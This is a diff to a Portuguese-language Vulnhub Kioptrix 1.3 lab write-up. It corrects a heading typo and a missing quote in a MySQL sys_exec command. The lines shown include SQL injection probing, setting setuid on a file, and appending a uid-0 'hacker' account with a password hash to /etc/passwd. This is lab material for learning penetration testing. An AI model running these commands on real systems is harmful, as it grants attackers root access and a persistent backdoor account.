@@ -100,7 +100,7 @@ Tentamos login admin:admin
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/web2.png)
 
-# SQLinjection
+# SQLInjection
 
 Agora tentamos login apenas uma ' (aspa)
 
@@ -348,7 +348,7 @@ select sys_exec('chmod u+s /tmp/setuid');
 Outro modo é adicionar um usuário no `/etc/passwd`
 
 ```
-select sys_exec('echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd);
+select sys_exec('echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd');
 ```
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.3/ss3.png)
